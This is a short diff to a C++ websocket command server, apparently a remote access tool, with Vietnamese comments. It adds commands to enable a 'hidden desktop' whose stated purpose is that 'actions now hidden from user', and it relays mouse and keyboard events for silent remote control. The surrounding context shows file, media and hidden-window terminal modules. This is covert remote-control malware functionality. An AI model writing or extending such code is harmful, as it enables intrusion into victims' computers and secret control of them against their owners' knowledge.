@@ -17,6 +17,7 @@
 #include "MediaManager.h"
 #include "CmdTerminal.h"
 #include "FileManager.h"
+#include "RemoteControl.h"
 
 // Tắt cảnh báo biên dịch không cần thiết
 #pragma warning(push)
@@ -279,7 +280,31 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
             }
 
             // =============================================================
-            // 5. NHÓM LỆNH: CMD TERMINAL
+            // 5. NHÓM LỆNH: REMOTE CONTROL
+            // =============================================================
+            else if (cmd == "ENABLE_HIDDEN_DESKTOP") {
+                HandleRemoteControl("ENABLE_HIDDEN_DESKTOP", j_req);
+                j_res["msg"] = "Hidden desktop enabled - actions now hidden from user";
+                j_res["type"] = "ACTION_RESULT";
+            }
+            else if (cmd == "DISABLE_HIDDEN_DESKTOP") {
+                HandleRemoteControl("DISABLE_HIDDEN_DESKTOP", j_req);
+                j_res["msg"] = "Hidden desktop disabled - back to normal desktop";
+                j_res["type"] = "ACTION_RESULT";
+            }
+            else if (cmd == "MOUSE_EVENT") {
+                HandleRemoteControl("MOUSE_EVENT", j_req);
+                // No response needed for real-time events
+                return;
+            }
+            else if (cmd == "KEYBOARD_EVENT") {
+                HandleRemoteControl("KEYBOARD_EVENT", j_req);
+                // No response needed for real-time events
+                return;
+            }
+
+            // =============================================================
+            // 6. NHÓM LỆNH: CMD TERMINAL
             // =============================================================
             else if (cmd == "CMD_START") {
                 bool showWindow = j_req.contains("showWindow") ? j_req["showWindow"].get<bool>() : false;
